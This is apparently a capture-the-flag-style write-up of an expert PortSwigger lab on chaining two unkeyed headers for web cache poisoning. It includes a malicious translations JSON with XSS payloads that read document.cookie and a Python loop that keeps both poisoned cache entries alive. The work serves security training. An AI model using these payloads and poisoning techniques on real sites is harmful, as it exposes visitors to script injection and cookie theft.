# Combining web cache poisoning vulnerabilities

**Category:** Web Cache Poisoning
**Difficulty:** EXPERT
**Lab:** https://portswigger.net/web-security/web-cache-poisoning/exploiting/lab-web-cache-poisoning-combining-vulnerabilities

Nine labs into this series, each vulnerability has been a single unkeyed input doing a single job. This lab is where the technique stops being about finding *one* flaw and starts being about orchestrating two independent unkeyed headers toward two different goals — one to force a victim into a vulnerable code path they wouldn't normally be in, the other to actually deliver the payload once they're there.

## The Target

The application supports multiple languages, gated behind a `lang` cookie. English-speaking visitors — which describes the lab's simulated victim by default — never trigger the page's translation-loading logic at all, because it only runs `initTranslations()` when `lang.toLowerCase() !== 'en'`. Getting XSS in front of an English-speaking victim first requires getting them a non-English `lang` cookie they never asked for.

## The Investigation

Param Miner-style fuzzing turned up two independently unkeyed headers doing two unrelated jobs: `X-Forwarded-Host` controls the `data.host` value that `initTranslations()` fetches its localization JSON from (the same pattern as the previous lab, just for translations instead of geolocation), and `X-Original-URL` overrides which server-side route actually handles the request — a path-override mechanism some frameworks expose for internal routing purposes.

The path to setting the victim's language cookie ran through `/setlang/es`, but requesting that path directly with `X-Original-URL` produced a response marked `Cache-Control: private` — not cacheable, a dead end for poisoning purposes. The workaround was an edge case in how the cache normalizes paths: requesting `X-Original-URL: /setlang\es` — a **backslash** instead of a forward slash — still routes to the same language-setting logic server-side (most path-handling code normalizes backslashes to forward slashes at some point), but the cache evaluates the backslash-containing path differently and marks the resulting `302` redirect as cacheable with `max-age=30`. That's a path-traversal-flavored parsing quirk being repurposed purely to flip a cacheability decision, not to traverse anywhere.

With both primitives isolated, the attack needed two poisoned cache entries running simultaneously and independently, since each has its own TTL and can expire out of sync with the other:

1. Poison `/` with `X-Original-URL: /setlang\es` — caches a `302` that sets `lang=es` on anyone who hits it.
2. Poison `/?localized=1` with `X-Forwarded-Host` pointed at the exploit server — caches a translations fetch from attacker-controlled infrastructure.

## The Exploit

We hosted a malicious Spanish translation set on the exploit server, injecting the XSS payload into the actual translation strings the page renders through `innerHTML`:

```python
translations = json.dumps({
    "en": {"name": "English"},
    "es": {
        "name": "espanol",
        "translations": {
            "Return to list": "<img src=1 onerror='alert(document.cookie)'>",
            "View details": "<img src=1 onerror='alert(document.cookie)'>",
            "Description:": "<img src=1 onerror='alert(document.cookie)'>"
        }
    }
})
```

served at `/resources/json/translations.json` with `Content-Type: application/json` and `Access-Control-Allow-Origin: *`. Then we ran both poisoning requests concurrently, on a loop, since either cache entry expiring independently would break the chain:

```python
r1 = await client.get(f"{lab_url}/", headers={"X-Original-URL": "/setlang\\es"})
r2 = await client.get(f"{lab_url}/?localized=1", headers={"X-Forwarded-Host": exploit_host})
```

With both entries poisoned, an English-speaking visitor loading `/` receives the cached `302` that silently sets their `lang` cookie to Spanish, their browser then loads the localized page, `initTranslations()` fires because their language is no longer `en`, fetches translations from our exploit server instead of the real backend, and `innerHTML`-injects our payload wherever a translated string is rendered.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's solution builds the identical two-stage chain: identify `X-Forwarded-Host` and `X-Original-URL` as independently unkeyed, discover that `X-Original-URL: /setlang\es` (backslash) produces a cacheable redirect where the forward-slash form doesn't, poison the home page with that redirect to force a Spanish language cookie onto visitors, poison the localized page separately with `X-Forwarded-Host` pointed at malicious translations, and note explicitly that both poisoned entries need to be kept alive simultaneously because they expire independently.

This lab is a genuine case of full technique convergence — there's no meaningfully different path here, and our approach matched PortSwigger's exactly, including the backslash normalization quirk that makes the whole chain possible. The only operational difference is that our dual-poison loop fires both requests concurrently via `asyncio.gather` rather than alternating between two Repeater tabs by hand, which matters here specifically because the two cache entries have independent TTLs — a script can keep both warm on a tight, consistent cadence in a way that's harder to sustain manually indefinitely.

## What This Teaches Us

The lab's title undersells what actually makes it hard: it's not that either individual header vulnerability is novel — both are variations of unkeyed-header patterns already covered earlier in this series — it's that solving it requires holding two independent, expiring exploitation primitives in your head (and in your poisoning loop) at once, where the *first* primitive's only job is to manufacture the conditions the *second* primitive needs to matter. An English-speaking victim was never vulnerable to the translations poisoning on its own; they had to be redirected into the Spanish-language code path first. Real-world cache poisoning chains rarely announce themselves as a single flaw — they're often exactly this shape, one unkeyed input reshaping what state a victim is in, and a second exploiting what that state now exposes.
